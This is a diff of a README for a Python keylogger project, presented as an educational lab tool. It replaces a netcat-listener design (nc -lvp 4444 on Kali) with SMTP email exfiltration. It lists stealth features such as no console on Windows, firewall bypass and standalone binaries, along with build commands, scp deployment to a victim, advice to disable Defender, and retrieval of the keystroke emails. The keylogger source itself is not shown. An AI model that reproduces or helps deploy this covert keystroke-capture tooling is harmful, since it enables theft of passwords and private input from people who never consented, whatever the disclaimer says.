@@ -1,97 +1,89 @@
-# Network Keystroke Monitor (Lab Edition)
+# KeyloggerHH - SMTP Keystroke Exfiltration Tool
 
-A standalone keystroke logger designed for **cybersecurity lab simulations**. It captures keystrokes on a victim machine and streams them to a Kali Linux listener in real time.
+Educational cybersecurity lab tool for keystroke capture via SMTP email.
 
----
+## Features
 
-## ⚙️ Configuration
+✅ Cross-platform (Linux & Windows)  
+✅ SMTP email exfiltration (bypasses firewall restrictions)  
+✅ Multithreaded architecture (non-blocking keystroke capture)  
+✅ Smart buffering (sends every 100 keys OR 60 seconds)  
+✅ Self-hosted SMTP support (Postfix, Sendmail, etc.)  
+✅ Stealth execution on Windows (no console)  
+✅ Standalone executable (no Python required on victim)
 
-Edit the attacker IP before building:
+## Network Topology
 
-```bash
-nano src/main.py
+```
+LAN (Victim) → DMZ (SMTP Server) → WAN (Attacker)
+Ubuntu Victim → SMTP Server (172.16.0.x) → Attacker's Mailbox
 ```
 
-Change:
+## Configuration
+
+Edit `src/main.py` before building:
 
 ```python
-KALI_IP = "192.168.X.X"
+SMTP_SERVER = "172.16.0.5"  # Your DMZ SMTP server IP
+SMTP_PORT = 587
+SENDER_EMAIL = "attacker@dmz.local"
+SENDER_PASSWORD = "your-password"
+RECEIVER_EMAIL = "attacker@dmz.local"  # Same account
 ```
 
-Replace it with your **Kali Linux IP**.
-
----
-
-## 🛠️ Build Instructions
+## Build Instructions
 
 ### Linux
-
 ```bash
 pip install pynput pyinstaller
 pyinstaller --onefile --clean --paths=src src/main.py
 ```
-
 Output: `dist/main`
 
----
-
-### Windows 🪟
-
-Run on a **Windows machine** (PowerShell or CMD):
-
+### Windows
 ```powershell
 pip install pynput pyinstaller
 pyinstaller --onefile --noconsole --clean --paths=src src/main.py
 ```
+Output: `dist/main.exe`
 
-Output: `dist/main.exe`  
-`--noconsole` hides the terminal window on Windows.
+## Lab Simulation
 
----
+### Prerequisites
+- DMZ SMTP server with user account created
+- Firewall rules: LAN → DMZ (port 587)
 
-## 🧪 Lab Simulation – How to Run
+### Step 1: Setup SMTP Server (DMZ)
+Create email account: `attacker@dmz.local`
 
-### Lab Setup
-- Attacker: Kali Linux
-- Victim: Windows / Linux
-- Port: 4444
+### Step 2: Build Keylogger
+- Edit configuration in `src/main.py`
+- Build executable
 
-### Step 1: Attacker (Kali)
-
+### Step 3: Deploy to Victim
 ```bash
-nc -lvp 4444
-```
-
-### Step 2: Transfer Binary to Victim
-
-```bash
-scp dist/main user@VICTIM_IP:/home/user/
-```
-
-### Step 3: Execution
-
-Linux victim:
-
-```bash
-chmod +x main
+scp dist/main user@victim:/tmp/
 ./main
 ```
 
-Windows victim:
+### Step 4: Retrieve Logs (Attacker)
+- Use Thunderbird/email client
+- Connect via IMAP to DMZ server
+- Download keystroke emails
 
-Double‑click `main.exe` (disable Defender for lab testing).
+## How It Works
 
----
+- Queue collects keystrokes (non-blocking)
+- Buffer aggregates keystrokes
+- Sender thread emails periodically
+- Thread-safe operations
 
-## 🛡️ Features
+## Email Format
 
-- Cross‑platform (Linux & Windows)
-- Standalone executable (no Python required)
-- Stealth execution on Windows
-- Clean keystroke stream
+- Subject: `Keylog - YYYY-MM-DD HH:MM:SS`
+- Body: Plain text keystrokes
+- Sent from and to same account
 
----
+## Disclaimer
 
-## ⚠️ Disclaimer
-
-For **authorized educational cybersecurity lab use only**. Do **NOT** use on real systems or real users.
+⚠️ **For authorized educational cybersecurity lab use only.** Do NOT use on real systems without permission.
